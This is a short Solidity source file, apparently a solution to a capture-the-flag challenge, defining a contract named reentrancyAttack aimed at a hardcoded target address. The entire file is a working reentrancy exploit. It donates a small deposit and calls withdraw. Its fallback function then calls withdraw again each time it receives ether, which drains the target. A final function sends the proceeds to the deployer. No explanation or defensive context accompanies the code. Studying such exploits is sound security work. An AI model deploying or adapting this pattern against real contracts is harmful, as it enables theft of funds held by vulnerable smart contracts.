// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IReentrance} from "./interface/reentrancyTarget.sol";

contract reentrancyAttack {
    IReentrance public Reentrance;
    address owner;

    constructor() {
        address reentrancy_contract = 0x1e37Aa9F99aD2343052890dA647e0d6E09F28639;
        Reentrance = IReentrance(reentrancy_contract);
        owner = msg.sender;
    }

    function deposit() public payable {
        Reentrance.donate{value: 0.001 ether}(address(this));
    }

    function attack() public {
        Reentrance.withdraw(1000000000000000);
    }

    fallback() external payable {
        Reentrance.withdraw(1000000000000000);
    }

    function withdraw() public payable {
        (bool sent, bytes memory data) = owner.call{
            value: address(this).balance
        }("");
    }
}
